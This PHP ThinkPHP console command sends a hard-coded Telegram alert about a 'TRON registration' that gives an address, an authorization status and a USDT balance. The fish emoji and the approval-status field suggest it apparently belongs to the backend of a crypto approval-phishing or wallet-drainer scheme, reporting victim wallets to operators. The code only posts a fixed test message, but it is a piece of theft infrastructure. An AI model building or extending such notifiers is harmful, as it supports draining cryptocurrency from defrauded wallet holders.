<?php
namespace app\api\command;

use think\console\Command;
use think\console\Input;
use think\console\input\Argument;
use think\console\input\Option;
use think\console\Output;
use think\Db;
use think\Env;
use \Longman\TelegramBot\Telegram;
use \Longman\TelegramBot\Request;
use \Longman\TelegramBot\Exception\TelegramException;

class Register extends Command
{
    protected function configure()
    {
        $this->setName('register')
            ->setDescription('the register command');
    }

    protected function execute(Input $input, Output $output)
    {
        $output->writeln('Register Start!!!');
        $Bot_Api_Key = Env::get('bot.apikey');
        $Bot_UserName = Env::get('bot.name');
        $chat_id = Env::get('bot.chat_id');
        $Telegram = new Telegram($Bot_Api_Key, $Bot_UserName); //实例化Telegram
        try {
            Request::sendMessage([
                'chat_id'    => $chat_id,
                'text'       => "【🐟TRON注册信息】\n【地址】`zHCylnIsguqBhWngrkSeoqYZczHXcxBf`\n【授权状态】未授权\n【账户余额】8005.63 USDT",
                'parse_mode' => "Markdown"
            ]);
        } catch (TelegramException $e) {
            $output->writeln($e->getMessage());
        }
    }
}